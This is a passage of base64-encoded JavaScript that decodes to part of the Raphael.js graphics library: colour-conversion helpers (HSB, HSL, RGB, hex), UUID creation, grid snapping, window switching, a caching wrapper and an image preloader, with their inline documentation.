1iZXIpIGdpdmVuIGFycmF5IG9mIHZhbHVlcyBvciBzdGVwIG9mIHRoZSBncmlkXG4gICAgIC0gdmFsdWUgKG51bWJlcikgdmFsdWUgdG8gYWRqdXN0XG4gICAgIC0gdG9sZXJhbmNlIChudW1iZXIpICNvcHRpb25hbCB0b2xlcmFuY2UgZm9yIHNuYXBwaW5nLiBEZWZhdWx0IGlzIGAxMGAuXG4gICAgID0gKG51bWJlcikgYWRqdXN0ZWQgdmFsdWUuXG4gICAgXFwqL1xuICAgIFIuc25hcFRvID0gZnVuY3Rpb24gKHZhbHVlcywgdmFsdWUsIHRvbGVyYW5jZSkge1xuICAgICAgICB0b2xlcmFuY2UgPSBSLmlzKHRvbGVyYW5jZSwgXCJmaW5pdGVcIikgPyB0b2xlcmFuY2UgOiAxMDtcbiAgICAgICAgaWYgKFIuaXModmFsdWVzLCBhcnJheSkpIHtcbiAgICAgICAgICAgIHZhciBpID0gdmFsdWVzLmxlbmd0aDtcbiAgICAgICAgICAgIHdoaWxlIChpLS0pIGlmIChhYnModmFsdWVzW2ldIC0gdmFsdWUpIDw9IHRvbGVyYW5jZSkge1xuICAgICAgICAgICAgICAgIHJldHVybiB2YWx1ZXNbaV07XG4gICAgICAgICAgICB9XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICB2YWx1ZXMgPSArdmFsdWVzO1xuICAgICAgICAgICAgdmFyIHJlbSA9IHZhbHVlICUgdmFsdWVzO1xuICAgICAgICAgICAgaWYgKHJlbSA8IHRvbGVyYW5jZSkge1xuICAgICAgICAgICAgICAgIHJldHVybiB2YWx1ZSAtIHJlbTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmIChyZW0gPiB2YWx1ZXMgLSB0b2xlcmFuY2UpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gdmFsdWUgLSByZW0gKyB2YWx1ZXM7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHZhbHVlO1xuICAgIH07XG5cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5jcmVhdGVVVUlEXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIFJGQzQxMjIsIHZlcnNpb24gNCBJRFxuICAgIFxcKi9cbiAgICB2YXIgY3JlYXRlVVVJRCA9IFIuY3JlYXRlVVVJRCA9IChmdW5jdGlvbiAodXVpZFJlZ0V4LCB1dWlkUmVwbGFjZXIpIHtcbiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHJldHVybiBcInh4eHh4eHh4LXh4eHgtNHh4eC15eHh4LXh4eHh4eHh4eHh4eFwiLnJlcGxhY2UodXVpZFJlZ0V4LCB1dWlkUmVwbGFjZXIpLnRvVXBwZXJDYXNlKCk7XG4gICAgICAgIH07XG4gICAgfSkoL1t4eV0vZywgZnVuY3Rpb24gKGMpIHtcbiAgICAgICAgdmFyIHIgPSBtYXRoLnJhbmRvbSgpICogMTYgfCAwLFxuICAgICAgICAgICAgdiA9IGMgPT0gXCJ4XCIgPyByIDogKHIgJiAzIHwgOCk7XG4gICAgICAgIHJldHVybiB2LnRvU3RyaW5nKDE2KTtcbiAgICB9KTtcblxuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLnNldFdpbmRvd1xuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXNlZCB3aGVuIHlvdSBuZWVkIHRvIGRyYXcgaW4gYCZsdDtpZnJhbWU+YC4gU3dpdGNoZWQgd2luZG93IHRvIHRoZSBpZnJhbWUgb25lLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBuZXd3aW4gKHdpbmRvdykgbmV3IHdpbmRvdyBvYmplY3RcbiAgICBcXCovXG4gICAgUi5zZXRXaW5kb3cgPSBmdW5jdGlvbiAobmV3d2luKSB7XG4gICAgICAgIGV2ZShcInJhcGhhZWwuc2V0V2luZG93XCIsIFIsIGcud2luLCBuZXd3aW4pO1xuICAgICAgICBnLndpbiA9IG5ld3dpbjtcbiAgICAgICAgZy5kb2MgPSBnLndpbi5kb2N1bWVudDtcbiAgICAgICAgaWYgKFIuX2VuZ2luZS5pbml0V2luKSB7XG4gICAgICAgICAgICBSLl9lbmdpbmUuaW5pdFdpbihnLndpbik7XG4gICAgICAgIH1cbiAgICB9O1xuICAgIHZhciB0b0hleCA9IGZ1bmN0aW9uIChjb2xvcikge1xuICAgICAgICBpZiAoUi52bWwpIHtcbiAgICAgICAgICAgIC8vIGh0dHA6Ly9kZWFuLmVkd2FyZHMubmFtZS93ZWJsb2cvMjAwOS8xMC9jb252ZXJ0LWFueS1jb2xvdXItdmFsdWUtdG8taGV4LWluLW1zaWUvXG4gICAgICAgICAgICB2YXIgdHJpbSA9IC9eXFxzK3xcXHMrJC9nO1xuICAgICAgICAgICAgdmFyIGJvZDtcbiAgICAgICAgICAgIHRyeSB7XG4gICAgICAgICAgICAgICAgdmFyIGRvY3VtID0gbmV3IEFjdGl2ZVhPYmplY3QoXCJodG1sZmlsZVwiKTtcbiAgICAgICAgICAgICAgICBkb2N1bS53cml0ZShcIjxib2R5PlwiKTtcbiAgICAgICAgICAgICAgICBkb2N1bS5jbG9zZSgpO1xuICAgICAgICAgICAgICAgIGJvZCA9IGRvY3VtLmJvZHk7XG4gICAgICAgICAgICB9IGNhdGNoKGUpIHtcbiAgICAgICAgICAgICAgICBib2QgPSBjcmVhdGVQb3B1cCgpLmRvY3VtZW50LmJvZHk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2YXIgcmFuZ2UgPSBib2QuY3JlYXRlVGV4dFJhbmdlKCk7XG4gICAgICAgICAgICB0b0hleCA9IGNhY2hlcihmdW5jdGlvbiAoY29sb3IpIHtcbiAgICAgICAgICAgICAgICB0cnkge1xuICAgICAgICAgICAgICAgICAgICBib2Quc3R5bGUuY29sb3IgPSBTdHIoY29sb3IpLnJlcGxhY2UodHJpbSwgRSk7XG4gICAgICAgICAgICAgICAgICAgIHZhciB2YWx1ZSA9IHJhbmdlLnF1ZXJ5Q29tbWFuZFZhbHVlKFwiRm9yZUNvbG9yXCIpO1xuICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9ICgodmFsdWUgJiAyNTUpIDw8IDE2KSB8ICh2YWx1ZSAmIDY1MjgwKSB8ICgodmFsdWUgJiAxNjcxMTY4MCkgPj4+IDE2KTtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFwiI1wiICsgKFwiMDAwMDAwXCIgKyB2YWx1ZS50b1N0cmluZygxNikpLnNsaWNlKC02KTtcbiAgICAgICAgICAgICAgICB9IGNhdGNoKGUpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFwibm9uZVwiO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdmFyIGkgPSBnLmRvYy5jcmVhdGVFbGVtZW50KFwiaVwiKTtcbiAgICAgICAgICAgIGkudGl0bGUgPSBcIlJhcGhhXFx4ZWJsIENvbG91ciBQaWNrZXJcIjtcbiAgICAgICAgICAgIGkuc3R5bGUuZGlzcGxheSA9IFwibm9uZVwiO1xuICAgICAgICAgICAgZy5kb2MuYm9keS5hcHBlbmRDaGlsZChpKTtcbiAgICAgICAgICAgIHRvSGV4ID0gY2FjaGVyKGZ1bmN0aW9uIChjb2xvcikge1xuICAgICAgICAgICAgICAgIGkuc3R5bGUuY29sb3IgPSBjb2xvcjtcbiAgICAgICAgICAgICAgICByZXR1cm4gZy5kb2MuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShpLCBFKS5nZXRQcm9wZXJ0eVZhbHVlKFwiY29sb3JcIik7XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gdG9IZXgoY29sb3IpO1xuICAgIH0sXG4gICAgaHNidG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiBcImhzYihcIiArIFt0aGlzLmgsIHRoaXMucywgdGhpcy5iXSArIFwiKVwiO1xuICAgIH0sXG4gICAgaHNsdG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiBcImhzbChcIiArIFt0aGlzLmgsIHRoaXMucywgdGhpcy5sXSArIFwiKVwiO1xuICAgIH0sXG4gICAgcmdidG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiB0aGlzLmhleDtcbiAgICB9LFxuICAgIHByZXBhcmVSR0IgPSBmdW5jdGlvbiAociwgZywgYikge1xuICAgICAgICBpZiAoZyA9PSBudWxsICYmIFIuaXMociwgXCJvYmplY3RcIikgJiYgXCJyXCIgaW4gciAmJiBcImdcIiBpbiByICYmIFwiYlwiIGluIHIpIHtcbiAgICAgICAgICAgIGIgPSByLmI7XG4gICAgICAgICAgICBnID0gci5nO1xuICAgICAgICAgICAgciA9IHIucjtcbiAgICAgICAgfVxuICAgICAgICBpZiAoZyA9PSBudWxsICYmIFIuaXMociwgc3RyaW5nKSkge1xuICAgICAgICAgICAgdmFyIGNsciA9IFIuZ2V0UkdCKHIpO1xuICAgICAgICAgICAgciA9IGNsci5yO1xuICAgICAgICAgICAgZyA9IGNsci5nO1xuICAgICAgICAgICAgYiA9IGNsci5iO1xuICAgICAgICB9XG4gICAgICAgIGlmIChyID4gMSB8fCBnID4gMSB8fCBiID4gMSkge1xuICAgICAgICAgICAgciAvPSAyNTU7XG4gICAgICAgICAgICBnIC89IDI1NTtcbiAgICAgICAgICAgIGIgLz0gMjU1O1xuICAgICAgICB9XG5cbiAgICAgICAgcmV0dXJuIFtyLCBnLCBiXTtcbiAgICB9LFxuICAgIHBhY2thZ2VSR0IgPSBmdW5jdGlvbiAociwgZywgYiwgbykge1xuICAgICAgICByICo9IDI1NTtcbiAgICAgICAgZyAqPSAyNTU7XG4gICAgICAgIGIgKj0gMjU1O1xuICAgICAgICB2YXIgcmdiID0ge1xuICAgICAgICAgICAgcjogcixcbiAgICAgICAgICAgIGc6IGcsXG4gICAgICAgICAgICBiOiBiLFxuICAgICAgICAgICAgaGV4OiBSLnJnYihyLCBnLCBiKSxcbiAgICAgICAgICAgIHRvU3RyaW5nOiByZ2J0b1N0cmluZ1xuICAgICAgICB9O1xuICAgICAgICBSLmlzKG8sIFwiZmluaXRlXCIpICYmIChyZ2Iub3BhY2l0eSA9IG8pO1xuICAgICAgICByZXR1cm4gcmdiO1xuICAgIH07XG5cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5jb2xvclxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogUGFyc2VzIHRoZSBjb2xvciBzdHJpbmcgYW5kIHJldHVybnMgb2JqZWN0IHdpdGggYWxsIHZhbHVlcyBmb3IgdGhlIGdpdmVuIGNvbG9yLlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBjbHIgKHN0cmluZykgY29sb3Igc3RyaW5nIGluIG9uZSBvZiB0aGUgc3VwcG9ydGVkIGZvcm1hdHMgKHNlZSBAUmFwaGFlbC5nZXRSR0IpXG4gICAgID0gKG9iamVjdCkgQ29tYmluZWQgUkdCICYgSFNCIG9iamVjdCBpbiBmb3JtYXQ6XG4gICAgIG8ge1xuICAgICBvICAgICByIChudW1iZXIpIHJlZCxcbiAgICAgbyAgICAgZyAobnVtYmVyKSBncmVlbixcbiAgICAgbyAgICAgYiAobnVtYmVyKSBibHVlLFxuICAgICBvICAgICBoZXggKHN0cmluZykgY29sb3IgaW4gSFRNTC9DU1MgZm9ybWF0OiAj4oCi4oCi4oCi4oCi4oCi4oCiLFxuICAgICBvICAgICBlcnJvciAoYm9vbGVhbikgYHRydWVgIGlmIHN0cmluZyBjYW7igJl0IGJlIHBhcnNlZCxcbiAgICAgbyAgICAgaCAobnVtYmVyKSBodWUsXG4gICAgIG8gICAgIHMgKG51bWJlcikgc2F0dXJhdGlvbixcbiAgICAgbyAgICAgdiAobnVtYmVyKSB2YWx1ZSAoYnJpZ2h0bmVzcyksXG4gICAgIG8gICAgIGwgKG51bWJlcikgbGlnaHRuZXNzXG4gICAgIG8gfVxuICAgIFxcKi9cbiAgICBSLmNvbG9yID0gZnVuY3Rpb24gKGNscikge1xuICAgICAgICB2YXIgcmdiO1xuICAgICAgICBpZiAoUi5pcyhjbHIsIFwib2JqZWN0XCIpICYmIFwiaFwiIGluIGNsciAmJiBcInNcIiBpbiBjbHIgJiYgXCJiXCIgaW4gY2xyKSB7XG4gICAgICAgICAgICByZ2IgPSBSLmhzYjJyZ2IoY2xyKTtcbiAgICAgICAgICAgIGNsci5yID0gcmdiLnI7XG4gICAgICAgICAgICBjbHIuZyA9IHJnYi5nO1xuICAgICAgICAgICAgY2xyLmIgPSByZ2IuYjtcbiAgICAgICAgICAgIGNsci5oZXggPSByZ2IuaGV4O1xuICAgICAgICB9IGVsc2UgaWYgKFIuaXMoY2xyLCBcIm9iamVjdFwiKSAmJiBcImhcIiBpbiBjbHIgJiYgXCJzXCIgaW4gY2xyICYmIFwibFwiIGluIGNscikge1xuICAgICAgICAgICAgcmdiID0gUi5oc2wycmdiKGNscik7XG4gICAgICAgICAgICBjbHIuciA9IHJnYi5yO1xuICAgICAgICAgICAgY2xyLmcgPSByZ2IuZztcbiAgICAgICAgICAgIGNsci5iID0gcmdiLmI7XG4gICAgICAgICAgICBjbHIuaGV4ID0gcmdiLmhleDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmIChSLmlzKGNsciwgXCJzdHJpbmdcIikpIHtcbiAgICAgICAgICAgICAgICBjbHIgPSBSLmdldFJHQihjbHIpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKFIuaXMoY2xyLCBcIm9iamVjdFwiKSAmJiBcInJcIiBpbiBjbHIgJiYgXCJnXCIgaW4gY2xyICYmIFwiYlwiIGluIGNscikge1xuICAgICAgICAgICAgICAgIHJnYiA9IFIucmdiMmhzbChjbHIpO1xuICAgICAgICAgICAgICAgIGNsci5oID0gcmdiLmg7XG4gICAgICAgICAgICAgICAgY2xyLnMgPSByZ2IucztcbiAgICAgICAgICAgICAgICBjbHIubCA9IHJnYi5sO1xuICAgICAgICAgICAgICAgIHJnYiA9IFIucmdiMmhzYihjbHIpO1xuICAgICAgICAgICAgICAgIGNsci52ID0gcmdiLmI7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGNsciA9IHtoZXg6IFwibm9uZVwifTtcbiAgICAgICAgICAgICAgICBjbHIuciA9IGNsci5nID0gY2xyLmIgPSBjbHIuaCA9IGNsci5zID0gY2xyLnYgPSBjbHIubCA9IC0xO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGNsci50b1N0cmluZyA9IHJnYnRvU3RyaW5nO1xuICAgICAgICByZXR1cm4gY2xyO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwuaHNiMnJnYlxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ29udmVydHMgSFNCIHZhbHVlcyB0byBSR0Igb2JqZWN0LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSBoIChudW1iZXIpIGh1ZVxuICAgICAtIHMgKG51bWJlcikgc2F0dXJhdGlvblxuICAgICAtIHYgKG51bWJlcikgdmFsdWUgb3IgYnJpZ2h0bmVzc1xuICAgICA9IChvYmplY3QpIFJHQiBvYmplY3QgaW4gZm9ybWF0OlxuICAgICBvIHtcbiAgICAgbyAgICAgciAobnVtYmVyKSByZWQsXG4gICAgIG8gICAgIGcgKG51bWJlcikgZ3JlZW4sXG4gICAgIG8gICAgIGIgKG51bWJlcikgYmx1ZSxcbiAgICAgbyAgICAgaGV4IChzdHJpbmcpIGNvbG9yIGluIEhUTUwvQ1NTIGZvcm1hdDogI+KAouKAouKAouKAouKAouKAolxuICAgICBvIH1cbiAgICBcXCovXG4gICAgUi5oc2IycmdiID0gZnVuY3Rpb24gKGgsIHMsIHYsIG8pIHtcbiAgICAgICAgaWYgKHRoaXMuaXMoaCwgXCJvYmplY3RcIikgJiYgXCJoXCIgaW4gaCAmJiBcInNcIiBpbiBoICYmIFwiYlwiIGluIGgpIHtcbiAgICAgICAgICAgIHYgPSBoLmI7XG4gICAgICAgICAgICBzID0gaC5zO1xuICAgICAgICAgICAgbyA9IGgubztcbiAgICAgICAgICAgIGggPSBoLmg7XG4gICAgICAgIH1cbiAgICAgICAgaCAqPSAzNjA7XG4gICAgICAgIHZhciBSLCBHLCBCLCBYLCBDO1xuICAgICAgICBoID0gKGggJSAzNjApIC8gNjA7XG4gICAgICAgIEMgPSB2ICogcztcbiAgICAgICAgWCA9IEMgKiAoMSAtIGFicyhoICUgMiAtIDEpKTtcbiAgICAgICAgUiA9IEcgPSBCID0gdiAtIEM7XG5cbiAgICAgICAgaCA9IH5+aDtcbiAgICAgICAgUiArPSBbQywgWCwgMCwgMCwgWCwgQ11baF07XG4gICAgICAgIEcgKz0gW1gsIEMsIEMsIFgsIDAsIDBdW2hdO1xuICAgICAgICBCICs9IFswLCAwLCBYLCBDLCBDLCBYXVtoXTtcbiAgICAgICAgcmV0dXJuIHBhY2thZ2VSR0IoUiwgRywgQiwgbyk7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5oc2wycmdiXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDb252ZXJ0cyBIU0wgdmFsdWVzIHRvIFJHQiBvYmplY3QuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIGggKG51bWJlcikgaHVlXG4gICAgIC0gcyAobnVtYmVyKSBzYXR1cmF0aW9uXG4gICAgIC0gbCAobnVtYmVyKSBsdW1pbm9zaXR5XG4gICAgID0gKG9iamVjdCkgUkdCIG9iamVjdCBpbiBmb3JtYXQ6XG4gICAgIG8ge1xuICAgICBvICAgICByIChudW1iZXIpIHJlZCxcbiAgICAgbyAgICAgZyAobnVtYmVyKSBncmVlbixcbiAgICAgbyAgICAgYiAobnVtYmVyKSBibHVlLFxuICAgICBvICAgICBoZXggKHN0cmluZykgY29sb3IgaW4gSFRNTC9DU1MgZm9ybWF0OiAj4oCi4oCi4oCi4oCi4oCi4oCiXG4gICAgIG8gfVxuICAgIFxcKi9cbiAgICBSLmhzbDJyZ2IgPSBmdW5jdGlvbiAoaCwgcywgbCwgbykge1xuICAgICAgICBpZiAodGhpcy5pcyhoLCBcIm9iamVjdFwiKSAmJiBcImhcIiBpbiBoICYmIFwic1wiIGluIGggJiYgXCJsXCIgaW4gaCkge1xuICAgICAgICAgICAgbCA9IGgubDtcbiAgICAgICAgICAgIHMgPSBoLnM7XG4gICAgICAgICAgICBoID0gaC5oO1xuICAgICAgICB9XG4gICAgICAgIGlmIChoID4gMSB8fCBzID4gMSB8fCBsID4gMSkge1xuICAgICAgICAgICAgaCAvPSAzNjA7XG4gICAgICAgICAgICBzIC89IDEwMDtcbiAgICAgICAgICAgIGwgLz0gMTAwO1xuICAgICAgICB9XG4gICAgICAgIGggKj0gMzYwO1xuICAgICAgICB2YXIgUiwgRywgQiwgWCwgQztcbiAgICAgICAgaCA9IChoICUgMzYwKSAvIDYwO1xuICAgICAgICBDID0gMiAqIHMgKiAobCA8IC41ID8gbCA6IDEgLSBsKTtcbiAgICAgICAgWCA9IEMgKiAoMSAtIGFicyhoICUgMiAtIDEpKTtcbiAgICAgICAgUiA9IEcgPSBCID0gbCAtIEMgLyAyO1xuXG4gICAgICAgIGggPSB+fmg7XG4gICAgICAgIFIgKz0gW0MsIFgsIDAsIDAsIFgsIENdW2hdO1xuICAgICAgICBHICs9IFtYLCBDLCBDLCBYLCAwLCAwXVtoXTtcbiAgICAgICAgQiArPSBbMCwgMCwgWCwgQywgQywgWF1baF07XG4gICAgICAgIHJldHVybiBwYWNrYWdlUkdCKFIsIEcsIEIsIG8pO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIFJhcGhhZWwucmdiMmhzYlxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogQ29udmVydHMgUkdCIHZhbHVlcyB0byBIU0Igb2JqZWN0LlxuICAgICA+IFBhcmFtZXRlcnNcbiAgICAgLSByIChudW1iZXIpIHJlZFxuICAgICAtIGcgKG51bWJlcikgZ3JlZW5cbiAgICAgLSBiIChudW1iZXIpIGJsdWVcbiAgICAgPSAob2JqZWN0KSBIU0Igb2JqZWN0IGluIGZvcm1hdDpcbiAgICAgbyB7XG4gICAgIG8gICAgIGggKG51bWJlcikgaHVlXG4gICAgIG8gICAgIHMgKG51bWJlcikgc2F0dXJhdGlvblxuICAgICBvICAgICBiIChudW1iZXIpIGJyaWdodG5lc3NcbiAgICAgbyB9XG4gICAgXFwqL1xuICAgIFIucmdiMmhzYiA9IGZ1bmN0aW9uIChyLCBnLCBiKSB7XG4gICAgICAgIGIgPSBwcmVwYXJlUkdCKHIsIGcsIGIpO1xuICAgICAgICByID0gYlswXTtcbiAgICAgICAgZyA9IGJbMV07XG4gICAgICAgIGIgPSBiWzJdO1xuXG4gICAgICAgIHZhciBILCBTLCBWLCBDO1xuICAgICAgICBWID0gbW1heChyLCBnLCBiKTtcbiAgICAgICAgQyA9IFYgLSBtbWluKHIsIGcsIGIpO1xuICAgICAgICBIID0gKEMgPT0gMCA/IG51bGwgOlxuICAgICAgICAgICAgIFYgPT0gciA/IChnIC0gYikgLyBDIDpcbiAgICAgICAgICAgICBWID09IGcgPyAoYiAtIHIpIC8gQyArIDIgOlxuICAgICAgICAgICAgICAgICAgICAgIChyIC0gZykgLyBDICsgNFxuICAgICAgICAgICAgKTtcbiAgICAgICAgSCA9ICgoSCArIDM2MCkgJSA2KSAqIDYwIC8gMzYwO1xuICAgICAgICBTID0gQyA9PSAwID8gMCA6IEMgLyBWO1xuICAgICAgICByZXR1cm4ge2g6IEgsIHM6IFMsIGI6IFYsIHRvU3RyaW5nOiBoc2J0b1N0cmluZ307XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5yZ2IyaHNsXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDb252ZXJ0cyBSR0IgdmFsdWVzIHRvIEhTTCBvYmplY3QuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHIgKG51bWJlcikgcmVkXG4gICAgIC0gZyAobnVtYmVyKSBncmVlblxuICAgICAtIGIgKG51bWJlcikgYmx1ZVxuICAgICA9IChvYmplY3QpIEhTTCBvYmplY3QgaW4gZm9ybWF0OlxuICAgICBvIHtcbiAgICAgbyAgICAgaCAobnVtYmVyKSBodWVcbiAgICAgbyAgICAgcyAobnVtYmVyKSBzYXR1cmF0aW9uXG4gICAgIG8gICAgIGwgKG51bWJlcikgbHVtaW5vc2l0eVxuICAgICBvIH1cbiAgICBcXCovXG4gICAgUi5yZ2IyaHNsID0gZnVuY3Rpb24gKHIsIGcsIGIpIHtcbiAgICAgICAgYiA9IHByZXBhcmVSR0IociwgZywgYik7XG4gICAgICAgIHIgPSBiWzBdO1xuICAgICAgICBnID0gYlsxXTtcbiAgICAgICAgYiA9IGJbMl07XG5cbiAgICAgICAgdmFyIEgsIFMsIEwsIE0sIG0sIEM7XG4gICAgICAgIE0gPSBtbWF4KHIsIGcsIGIpO1xuICAgICAgICBtID0gbW1pbihyLCBnLCBiKTtcbiAgICAgICAgQyA9IE0gLSBtO1xuICAgICAgICBIID0gKEMgPT0gMCA/IG51bGwgOlxuICAgICAgICAgICAgIE0gPT0gciA/IChnIC0gYikgLyBDIDpcbiAgICAgICAgICAgICBNID09IGcgPyAoYiAtIHIpIC8gQyArIDIgOlxuICAgICAgICAgICAgICAgICAgICAgIChyIC0gZykgLyBDICsgNCk7XG4gICAgICAgIEggPSAoKEggKyAzNjApICUgNikgKiA2MCAvIDM2MDtcbiAgICAgICAgTCA9IChNICsgbSkgLyAyO1xuICAgICAgICBTID0gKEMgPT0gMCA/IDAgOlxuICAgICAgICAgICAgIEwgPCAuNSA/IEMgLyAoMiAqIEwpIDpcbiAgICAgICAgICAgICAgICAgICAgICBDIC8gKDIgLSAyICogTCkpO1xuICAgICAgICByZXR1cm4ge2g6IEgsIHM6IFMsIGw6IEwsIHRvU3RyaW5nOiBoc2x0b1N0cmluZ307XG4gICAgfTtcbiAgICBSLl9wYXRoMnN0cmluZyA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMuam9pbihcIixcIikucmVwbGFjZShwMnMsIFwiJDFcIik7XG4gICAgfTtcbiAgICBmdW5jdGlvbiByZXB1c2goYXJyYXksIGl0ZW0pIHtcbiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gYXJyYXkubGVuZ3RoOyBpIDwgaWk7IGkrKykgaWYgKGFycmF5W2ldID09PSBpdGVtKSB7XG4gICAgICAgICAgICByZXR1cm4gYXJyYXkucHVzaChhcnJheS5zcGxpY2UoaSwgMSlbMF0pO1xuICAgICAgICB9XG4gICAgfVxuICAgIGZ1bmN0aW9uIGNhY2hlcihmLCBzY29wZSwgcG9zdHByb2Nlc3Nvcikge1xuICAgICAgICBmdW5jdGlvbiBuZXdmKCkge1xuICAgICAgICAgICAgdmFyIGFyZyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMCksXG4gICAgICAgICAgICAgICAgYXJncyA9IGFyZy5qb2luKFwiXFx1MjQwMFwiKSxcbiAgICAgICAgICAgICAgICBjYWNoZSA9IG5ld2YuY2FjaGUgPSBuZXdmLmNhY2hlIHx8IHt9LFxuICAgICAgICAgICAgICAgIGNvdW50ID0gbmV3Zi5jb3VudCA9IG5ld2YuY291bnQgfHwgW107XG4gICAgICAgICAgICBpZiAoY2FjaGVbaGFzXShhcmdzKSkge1xuICAgICAgICAgICAgICAgIHJlcHVzaChjb3VudCwgYXJncyk7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHBvc3Rwcm9jZXNzb3IgPyBwb3N0cHJvY2Vzc29yKGNhY2hlW2FyZ3NdKSA6IGNhY2hlW2FyZ3NdO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgY291bnQubGVuZ3RoID49IDFlMyAmJiBkZWxldGUgY2FjaGVbY291bnQuc2hpZnQoKV07XG4gICAgICAgICAgICBjb3VudC5wdXNoKGFyZ3MpO1xuICAgICAgICAgICAgY2FjaGVbYXJnc10gPSBmW2FwcGx5XShzY29wZSwgYXJnKTtcbiAgICAgICAgICAgIHJldHVybiBwb3N0cHJvY2Vzc29yID8gcG9zdHByb2Nlc3NvcihjYWNoZVthcmdzXSkgOiBjYWNoZVthcmdzXTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gbmV3ZjtcbiAgICB9XG5cbiAgICB2YXIgcHJlbG9hZCA9IFIuX3ByZWxvYWQgPSBmdW5jdGlvbiAoc3JjLCBmKSB7XG4gICAgICAgIHZhciBpbWcgPSBnLmRvYy5jcmVhdGVFbGVtZW50KFwiaW1nXCIpO1xuICAgICAgICBpbWcuc3R5bGUuY3NzVGV4dCA9IFwicG9zaXRpb246YWJzb2x1dGU7bGVmdDotOTk5OWVtO3RvcDotOTk5OWVtXCI7XG4gICAgICAgIGltZy5vbmxvYWQgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICBmLmNhbGwodGhpcyk7XG4gICAgICAgICAgICB0aGlzLm9ubG9hZCA9IG51bGw7XG4gICAgICAgICAgICBnLmRvYy5ib2R5LnJlbW92ZUNoaWxkKHRoaXMpO1xuICAgICAgICB9O1xuICAgICAgICBpbWcub25lcnJvciA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGcuZG9jLmJvZHkucmVtb3ZlQ2hpbGQodGhpcyk7XG4gICAgICAgIH07XG4gICAgICAgIGcuZG9jLmJvZHkuYXBwZW5kQ2hpbGQoaW1nKTtcbiAgICAgICAgaW1nLnNyYyA9IHNyYztcbiAgICB9O1xuXG4gICAgZnVuY3Rpb24gY2xyVG9TdHJpbmcoKSB7XG4gICAgICAgIHJldHVybiB0aGlzLmhleDtcbiAgICB9XG5cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5nZXRSR0JcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFBhcnNlcyBjb2xvdXIgc3RyaW5nIGFzIFJHQiBvYmplY3RcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gY29sb3VyIChzdHJpbmcpIGNvbG91ciBzdHJpbmcgaW4gb25lIG9mIGZvcm1hdHM6XG4gICAgICMgPHVsPlxuICAgICAjICAgICA8bGk+Q29sb3VyIG5hbWUgKOKAnDxjb2RlPnJlZDwvY29kZT7igJ0sIOKAnDxjb2RlPmdyZWVuPC9jb2RlPuKAnSwg4oCcPGNvZGU+Y29ybmZsb3dlcmJsdWU8L2NvZGU+4oCdLCBldGMpPC9saT5cbiAgICAgIyAgICAgPGxpPiPigKLigKLigKIg4oCUIHNob3J0ZW5lZCBIVE1MIGNvbG91cjogKOKAnDxjb2RlPiMwMDA8L2NvZGU+4oCdLCDigJw8Y29kZT4jZmMwPC9jb2RlPuKAnSwgZXRjKTwvbGk+XG4gICAgICMgICAgIDxsaT4j4oCi4oCi4oCi4oCi4oCi4oCiIOKAlCBmdWxsIGxlbmd0aCBIVE1MIGNvbG91cjogKOKAnDxjb2RlPiMwMDAwMDA8L2NvZGU+4oCdLCDigJw8Y29kZT4jYmQyMzAwPC9jb2RlPuKAnSk8L2xpPlxuICAgICAjICAgICA8